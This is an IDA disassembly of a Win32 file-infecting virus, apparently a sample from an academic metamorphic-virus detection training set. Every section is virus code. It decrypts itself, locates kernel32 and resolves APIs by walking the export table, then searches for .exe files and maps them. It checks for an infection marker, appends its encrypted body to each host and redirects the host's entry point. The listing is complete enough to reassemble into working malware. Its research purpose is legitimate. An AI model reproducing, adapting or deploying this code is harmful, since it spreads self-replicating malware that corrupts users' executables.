

;
; 浜様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様�
; �	This file is generated by The Interactive Disassembler (IDA)	    �
; �	Copyright (c) 2003 by DataRescue sa/nv,	<ida@datarescue.com>	    �
; � Licensed to: Mark Stamp, San Jose State University,	1 user,	academic, 11/2003 �
; 藩様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様�
;
; 陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳�
; File Name   :	C:\Documents and Settings\Fiona\My Documents\CS	298_Metamorphic	virus\HMM\TrainSet\N36.EXE
; Format      :	Portable executable for	IBM PC (PE)
; Imagebase   :	400000
; Section 1. (virtual address 00001000)
; Virtual size			: 00018000 (  98304.)
; Section size in file		: 00017E00 (  97792.)
; Offset to raw	data for section: 00000600
; Flags	60000020: Text Executable Readable
; Alignment	: 16 bytes ?

		model flat

; 様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様�

; Segment type:	Pure code
; Segment permissions: Read/Execute
CODE		segment	para public 'CODE' use32
		assume cs:CODE
		;org 401000h
		assume es:nothing, ss:nothing, ds:nothing, fs:nothing, gs:nothing

		public start
start:
		nop
		nop
		nop

		nop
		nop
		nop

loc_418526:				; DATA XREF: sub_4189F8+118r
		call	$+5

loc_41852B:				; DATA XREF: CODE:00418532o
		mov	ebx, [esp]
		inc	esp
		add	esp, 3
		sub	ebx, offset loc_41852B
		mov	ebp, ebx
		cmp	ebp, 0
		jz	short near ptr dword_418559
		push	1EAh
		lea	ecx, dword_418559[ebp]
		pop	edx

loc_41854B:				; CODE XREF: CODE:00418557j
		mov	eax, [ecx]
		not	eax
		neg	eax
		mov	[ecx], eax
		add	ecx, 4
		dec	edx
		jnz	short loc_41854B
; 陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳�
dword_418559	dd 427E9h		; CODE XREF: CODE:0041853Dj
					; DATA XREF: CODE:00418544r
dword_41855D	dd 6 dup(0), 72695600h,	3A207375h, 6E695720h, 4E2E3233h
					; DATA XREF: CODE:0041898Cw
					; CODE:00418996w ...
		dd 41203633h, 6F687475h, 203A2072h, 6B616E53h, 74794265h
		dd 65h,	8 dup(0), 460D0000h, 4E646E69h,	46747865h, 41656C69h
		dd 6D6E550Fh, 69567061h, 664F7765h, 656C6946h, 70614D0Dh
		dd 77656956h, 6946664Fh, 460E656Ch, 46646E69h, 74737269h
		dd 656C6946h, 72431241h, 65746165h, 656C6946h, 7070614Dh
		dd 41676E69h, 6572430Bh, 46657461h, 41656C69h, 6E694609h
		dd 6F6C4364h, 430B6573h, 65736F6Ch, 646E6148h, 2E2A656Ch
		dd 657865h, 61h	dup(0)

; 栩栩栩栩栩栩栩� S U B	R O U T	I N E 栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩�


sub_4187B9	proc near		; CODE XREF: CODE:00418903p
		pusha
		mov	eax, ss:(dword_41855D+4Ah)[ebp]
		mov	edi, [eax+78h]
		add	edi, ss:(dword_41855D+258h)[ebp]
		add	edi, 1Ch
		mov	eax, [edi]
		add	eax, ss:(dword_41855D+258h)[ebp]
		sub	ss:(dword_41855D+108h)[ebp], ecx
		add	edi, 4
		mov	ebx, 90171Dh
		mov	ss:(dword_41855D+9)[ebp], eax
		mov	eax, [edi]
		add	eax, ss:(dword_41855D+258h)[ebp]
		dec	edi
		add	edi, 5
		mov	ss:(dword_41855D+100h)[ebp], eax
		mov	eax, [edi]
		add	eax, ss:(dword_41855D+258h)[ebp]
		mov	ss:(dword_41855D+0FCh)[ebp], eax
		and	ebx, 5D5DD56h
		push	0
		pop	ebx
		add	ebx, ss:(dword_41855D+100h)[ebp]

loc_418817:				; CODE XREF: sub_4187B9+B2j
		mov	ss:(dword_41855D+0D8h)[ebp], ebx
		mov	ecx, [ebx]
		add	ecx, ss:(dword_41855D+258h)[ebp]
		mov	ebx, ecx
		mov	edi, ebx
		mov	ss:(dword_41855D+15h)[ebp], edx
		push	edi
		push	esi
		cld

loc_418832:				; CODE XREF: sub_4187B9+8Dj
		mov	al, [esi]
		cmp	al, [edi]
		jnz	short loc_418848
		sub	edx, 1
		cmp	edx, 0
		jz	short loc_41886F
		sub	edi, 0FFFFFFFFh
		sub	esi, 0FFFFFFFFh
		jmp	short loc_418832
; 陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳�

loc_418848:				; CODE XREF: sub_4187B9+7Dj
		pop	esi
		pop	edi
		mov	edx, ss:(dword_41855D+15h)[ebp]
		mov	ebx, ss:(dword_41855D+0D8h)[ebp]
		inc	ebx
		add	ebx, 3
		add	word ptr ss:(dword_41855D+252h)[ebp], 1
		cmp	word ptr ss:(dword_41855D+252h)[ebp], 2007h
		jnz	short loc_418817
		jmp	short loc_4188A7
; 陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳�

loc_41886F:				; CODE XREF: sub_4187B9+85j
		pop	ebx
		pop	edi
		sub	ecx, ecx
		mov	cx, word ptr ss:(dword_41855D+252h)[ebp]
		clc
		rcl	ecx, 1
		add	ecx, ss:(dword_41855D+0FCh)[ebp]
		mov	edi, ecx
		movzx	ecx, word ptr [edi]
		clc
		rcl	ecx, 2
		add	ecx, ss:(dword_41855D+9)[ebp]
		mov	ebx, ss:(dword_41855D+258h)[ebp]
		add	ebx, [ecx]
		add	eax, 2E8DD82h
		mov	ss:(dword_41855D+52h)[ebp], ebx
		popa
		retn
; 陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳�

loc_4188A7:				; CODE XREF: sub_4187B9+B4j
		pop	ecx
		popa
		jmp	loc_418C5C
sub_4187B9	endp


; 栩栩栩栩栩栩栩� S U B	R O U T	I N E 栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩�


sub_4188AE	proc near		; CODE XREF: sub_4189F8+2Cp
					; sub_4189F8+DBp
		pusha
		mov	eax, ss:(dword_41855D+104h)[ebp]
		mov	ecx, ss:(dword_41855D+5Eh)[ebp]
		sub	edx, edx
		mov	ss:(dword_41855D+254h)[ebp], eax
		div	ecx
		sub	ecx, edx
		mov	eax, ss:(dword_41855D+254h)[ebp]
		add	eax, ecx
		mov	ss:(dword_41855D+104h)[ebp], 0
		add	ss:(dword_41855D+104h)[ebp], eax
		popa
		retn
sub_4188AE	endp

; 陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳�

loc_4188E1:				; DATA XREF: CODE:004189EFo
		push	8
		pop	ebx
		lea	esi, (dword_41855D+62h)[ebp]
		mov	ecx, ebp
		add	ecx, (offset dword_41855D+0DCh)

loc_4188F2:				; CODE XREF: CODE:00418921j
		mov	word ptr ss:(dword_41855D+252h)[ebp], 0
		push	0
		pop	edx
		mov	dl, [esi]
		sub	esi, 0FFFFFFFFh
		call	sub_4187B9
		add	esi, edx
		adc	eax, eax
		mov	edi, ss:(dword_41855D+52h)[ebp]
		mov	dword ptr [ecx], 0
		add	[ecx], edi
		inc	ecx
		add	ecx, 3
		sub	ebx, 1
		jnz	short loc_4188F2
		lea	esi, byte_41892B[ebp]
		push	esi
		retn
; 陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳�
byte_41892B	db 0FFh, 0B5h		; DATA XREF: CODE:00418923r
		dd offset dword_41855D+46h
; 陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳�
		pop	dword ptr ss:(loc_418C61+1)[ebp]
		push	ss:(dword_41855D+42h)[ebp]
		pop	dword ptr ss:(loc_418C66+1)[ebp]
		mov	ebx, (offset dword_41855D+0D2h)
		add	ebx, ebp
		call	sub_418B4B
		inc	eax
		jz	short loc_418974
		push	14h
		pop	ss:(dword_41855D+3Eh)[ebp]

loc_41895A:				; CODE XREF: CODE:00418972j
		call	sub_418C78
		mov	edx, ss:(dword_41855D+3Eh)[ebp]
		cmp	edx, 0
		jz	short loc_418974
		call	sub_418B65
		cmp	eax, 0
		jnz	short loc_41895A

loc_418974:				; CODE XREF: CODE:00418950j
					; CODE:00418968j
		push	ss:(dword_41855D+0Dh)[ebp]
		call	ss:(dword_41855D+0F4h)[ebp]
		jmp	loc_418C5C
; 陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳�
		mov	edi, [esp]
		mov	di, 0
		mov	ss:(dword_41855D+1)[ebp], 85649h
		sub	ss:(dword_41855D+1)[ebp], 1611h

loc_4189A0:				; CODE XREF: CODE:004189C4j
		cmp	ss:(dword_41855D+1)[ebp], 0
		jnz	short loc_4189AE
		jmp	loc_418C44
; 陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳�

loc_4189AE:				; CODE XREF: CODE:004189A7j
		movzx	eax, word ptr [edi]
		cmp	eax, 5A4Dh
		jz	short loc_4189C6

loc_4189B8:				; CODE XREF: CODE:004189E1j
		add	edi, 0FFFF0000h
		dec	ss:(dword_41855D+1)[ebp]
		jmp	short loc_4189A0
; 陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳�

loc_4189C6:				; CODE XREF: CODE:004189B6j
		add	edi, 3Ch
		and	ecx, 1F35E4Ch
		mov	esi, [edi]
		dec	edi
		sub	edi, 3Bh
		add	esi, edi
		movzx	eax, word ptr [esi]
		xor	eax, 4550h
		jz	short loc_4189E3
		jmp	short loc_4189B8
; 陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳�

loc_4189E3:				; CODE XREF: CODE:004189DFj
		mov	ss:(dword_41855D+4Ah)[ebp], esi
		mov	ss:(dword_41855D+258h)[ebp], edi
		mov	ebx, offset loc_4188E1
		add	ebx, ebp
		push	ebx
		retn

; 栩栩栩栩栩栩栩� S U B	R O U T	I N E 栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩�


sub_4189F8	proc near		; CODE XREF: sub_418C78+7Bp
		push	ss:(dword_41855D+4Eh)[ebp]
		pop	ecx
		mov	edi, [ecx+3Ch]
		add	edi, ecx
		mov	ecx, [edi+3Ch]
		mov	edx, ss:(dword_41855D+12Ch)[ebp]
		mov	ss:(dword_41855D+5Eh)[ebp], ecx
		or	eax, 54E50Fh
		add	edx, 7DAh
		mov	ss:(dword_41855D+104h)[ebp], edx
		call	sub_4188AE
		mov	edx, ss:(dword_41855D+104h)[ebp]
		mov	ss:(dword_41855D+56h)[ebp], 0
		add	ss:(dword_41855D+56h)[ebp], edx
		pusha
		call	sub_418C2B
		popa
		push	edx
		pop	ss:(dword_41855D+12Ch)[ebp]
		call	sub_418BC1
		jb	loc_418B49
		push	ss:(dword_41855D+4Eh)[ebp]
		pop	esi
		mov	edx, esi
		add	edx, [esi+3Ch]
		mov	esi, 0FFFFE037h
		add	esi, 1FC9h
		add	esi, edx
		movzx	eax, word ptr [esi+6]
		mov	ss:(dword_41855D+108h)[ebp], 431656h
		sub	eax, 1
		imul	eax, 28h
		add	edx, eax
		add	edx, 78h
		mov	eax, [esi+74h]
		shl	eax, 3
		add	edx, eax
		mov	eax, [esi+34h]
		mov	ss:(dword_41855D+42h)[ebp], eax
		mov	ebx, [esi+28h]
		mov	ss:(dword_41855D+46h)[ebp], ebx
		mov	ebx, [edx+10h]
		mov	ecx, ebx
		add	ebx, [edx+14h]
		push	ebx
		mov	eax, ecx
		add	eax, [edx+0Ch]
		mov	ss:(dword_41855D+11h)[ebp], eax
		mov	[esi+28h], eax
		mov	eax, [edx+10h]
		push	eax
		push	dword ptr [esi+3Ch]
		add	eax, 7DAh
		pop	ss:(dword_41855D+5Eh)[ebp]
		mov	ss:(dword_41855D+104h)[ebp], eax
		call	sub_4188AE
		mov	eax, ss:(dword_41855D+104h)[ebp]
		mov	dword ptr [edx+10h], 0
		add	[edx+10h], eax
		pop	eax
		add	eax, 7DAh
		mov	dword ptr [edx+8], 0
		add	[edx+8], eax
		mov	eax, [edx+0Ch]
		add	eax, [edx+10h]
		mov	[esi+50h], eax
		or	dword ptr [edx+24h], 0A0000020h
		mov	dword ptr [esi+4Ch], 4E3336h
		pop	edi
		lea	esi, loc_418526[ebp]
		add	edi, ss:(dword_41855D+4Eh)[ebp]
		mov	edx, 33h

loc_418B21:				; CODE XREF: sub_4189F8+12Bj
		movsb
		dec	edx
		jnz	short loc_418B21
		xor	edx, edx
		add	edx, 1EAh

loc_418B2D:				; CODE XREF: sub_4189F8+13Ej
		lodsd
		neg	eax
		not	eax
		stosd
		sub	edx, 1
		jnz	short loc_418B2D
		mov	edx, ss:(dword_41855D+3Eh)[ebp]
		sub	edx, 1
		mov	ss:(dword_41855D+3Eh)[ebp], edx
		clc
		retn
; 陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳�

loc_418B49:				; CODE XREF: sub_4189F8+5Aj
		stc
		retn
sub_4189F8	endp


; 栩栩栩栩栩栩栩� S U B	R O U T	I N E 栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩�


sub_418B4B	proc near		; CODE XREF: CODE:0041894Ap
		call	sub_418B80
		lea	eax, (dword_41855D+10Ch)[ebp]
		push	eax
		push	ebx
		call	ss:(dword_41855D+0E8h)[ebp]
		mov	ss:(dword_41855D+0Dh)[ebp], eax
		retn
sub_418B4B	endp


; 栩栩栩栩栩栩栩� S U B	R O U T	I N E 栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩�


sub_418B65	proc near		; CODE XREF: CODE:0041896Ap
		call	sub_418B80
		mov	edi, (offset dword_41855D+10Ch)
		add	edi, ebp
		push	edi
		mov	ebx, ss:(dword_41855D+0Dh)[ebp]
		push	ebx
		call	ss:(dword_41855D+0DCh)[ebp]
		retn
sub_418B65	endp


; 栩栩栩栩栩栩栩� S U B	R O U T	I N E 栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩�


sub_418B80	proc near		; CODE XREF: sub_418B4Bp sub_418B65p
		pusha
		mov	ecx, 114h
		lea	esi, (dword_41855D+138h)[ebp]

loc_418B8C:				; CODE XREF: sub_418B80+13j
		mov	byte ptr [esi],	0
		add	esi, 1
		dec	ecx
		jnz	short loc_418B8C
		popa
		retn
sub_418B80	endp


; 栩栩栩栩栩栩栩� S U B	R O U T	I N E 栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩�


sub_418B97	proc near		; CODE XREF: sub_418C78p
		push	0
		push	0
		push	3
		push	0
		push	1
		mov	eax, 0C0000000h
		push	eax
		lea	ebx, (dword_41855D+138h)[ebp]
		push	ebx
		call	ss:(dword_41855D+0F0h)[ebp]
		cmp	eax, 0FFFFFFFFh
		jz	short loc_418C29
		lea	ecx, (dword_41855D+5)[ebp]
		mov	[ecx], eax
sub_418B97	endp


; 栩栩栩栩栩栩栩� S U B	R O U T	I N E 栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩�


sub_418BC1	proc near		; CODE XREF: sub_4189F8+55p
		mov	ecx, ss:(dword_41855D+12Ch)[ebp]
		shr	edx, 5
		push	ecx
		push	0
		push	ecx
		push	0
		mov	ebx, 0FFFFFFFFh
		add	ebx, 5
		push	ebx
		push	0
		push	ss:(dword_41855D+5)[ebp]
		call	ss:(dword_41855D+0ECh)[ebp]
		mov	ss:(dword_41855D+5Ah)[ebp], eax
		pop	ecx
		test	eax, eax
		jz	short loc_418C1D
		push	ecx
		push	0
		push	0
		mov	edx, 1Bh
		sub	edx, 19h
		push	edx
		push	ss:(dword_41855D+5Ah)[ebp]
		call	ss:(dword_41855D+0E4h)[ebp]
		or	eax, eax
		jz	short sub_418C18
		mov	ss:(dword_41855D+4Eh)[ebp], eax
		clc
		retn
sub_418BC1	endp


; 栩栩栩栩栩栩栩� S U B	R O U T	I N E 栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩�


sub_418C18	proc near		; CODE XREF: sub_418BC1+4Dj
					; sub_418C78+82p
		call	sub_418C2B

loc_418C1D:				; CODE XREF: sub_418BC1+2Fj
		push	ss:(dword_41855D+5)[ebp]
		call	ss:(dword_41855D+0F8h)[ebp]

loc_418C29:				; CODE XREF: sub_418B97+20j
		stc
		retn
sub_418C18	endp


; 栩栩栩栩栩栩栩� S U B	R O U T	I N E 栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩�


sub_418C2B	proc near		; CODE XREF: sub_4189F8+48p
					; sub_418C18p
		push	ss:(dword_41855D+4Eh)[ebp]
		call	ss:(dword_41855D+0E0h)[ebp]
		push	ss:(dword_41855D+5Ah)[ebp]
		call	ss:(dword_41855D+0F8h)[ebp]
		retn
sub_418C2B	endp

; 陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳�

loc_418C44:				; CODE XREF: CODE:004189A9j
		mov	eax, ss:(dword_41855D+42h)[ebp]
		mov	dword ptr ss:(loc_418C66+1)[ebp], eax
		mov	eax, ss:(dword_41855D+46h)[ebp]
		mov	dword ptr ss:(loc_418C61+1)[ebp], eax

loc_418C5C:				; CODE XREF: sub_4187B9+F0j
					; CODE:00418980j
		cmp	ebp, 0
		jz	short loc_418C6D

loc_418C61:				; DATA XREF: CODE:00418931w
					; CODE:00418C56w
		mov	eax, 0

loc_418C66:				; DATA XREF: CODE:0041893Dw
					; CODE:00418C4Aw
		add	eax, 0
		push	eax
		retn
; 陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳�

loc_418C6D:				; CODE XREF: CODE:00418C5Fj
		mov	ebx, 0
		push	ebx
		call	ExitProcess

; 栩栩栩栩栩栩栩� S U B	R O U T	I N E 栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩�


sub_418C78	proc near		; CODE XREF: CODE:0041895Ap
		call	sub_418B97
		jb	locret_418CFF
		xor	ebx, ebx
		add	ebx, ss:(dword_41855D+4Eh)[ebp]
		cmp	word ptr [ebx],	5A4Dh
		jz	short loc_418CAA
		mov	ecx, 0
		add	ecx, 9C10h
		cmp	ecx, 9C10h
		jz	short loc_418CFA
		and	eax, 593455Bh

loc_418CAA:				; CODE XREF: sub_418C78+18j
		cmp	word ptr [ebx+3Ch], 0
		jnz	short loc_418CB3
		jmp	short loc_418CFA
; 陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳�

loc_418CB3:				; CODE XREF: sub_418C78+37j
		sub	edi, edi
		add	edi, [ebx+3Ch]
		cmp	ss:(dword_41855D+12Ch)[ebp], edi
		jb	short loc_418CFA
		add	edi, ebx
		cmp	word ptr [edi],	4550h
		jz	short loc_418CDC
		mov	ecx, 0
		add	ecx, 3C9Eh
		cmp	ecx, 3C9Eh
		jz	short loc_418CFA

loc_418CDC:				; CODE XREF: sub_418C78+4Fj
		cmp	dword ptr [edi+4Ch], 4E3336h
		jz	short loc_418CFA
		mov	dx, [edi+16h]
		and	dx, 2
		cmp	dx, 2
		jnz	short loc_418CFA
		call	sub_4189F8
		jb	short locret_418CFF

loc_418CFA:				; CODE XREF: sub_418C78+2Bj
					; sub_418C78+39j ...
		call	sub_418C18

locret_418CFF:				; CODE XREF: sub_418C78+5j
					; sub_418C78+80j
		retn
sub_418C78	endp

; [00000006 BYTES: COLLAPSED FUNCTION ExitProcess. PRESS KEYPAD	"+" TO EXPAND]
		dd 3Eh dup(0)
		align 4
		dd 80h dup(?)
CODE		ends

; Section 2. (virtual address 00019000)
; Virtual size			: 00001000 (   4096.)
; Section size in file		: 00000000 (	  0.)
; Offset to raw	data for section: 00018400
; Flags	C0000040: Data Readable	Writable
; Alignment	: 16 bytes ?
; 様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様�

; Segment type:	Pure data
; Segment permissions: Read/Write
DATA		segment	para public 'DATA' use32
		assume cs:DATA
		;org 419000h
		align 2000h
DATA		ends

;
; Imports from KERNEL32
;
; Section 3. (virtual address 0001A000)
; Virtual size			: 00001000 (   4096.)
; Section size in file		: 00000200 (	512.)
; Offset to raw	data for section: 00018400
; Flags	C0000040: Data Readable	Writable
; Alignment	: 16 bytes ?
; 様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様�

; Segment type:	Externs
; _idata
; void __stdcall __imp_ExitProcess(UINT	uExitCode)
		extrn __imp_ExitProcess:dword ;	DATA XREF: ExitProcessr



		end start
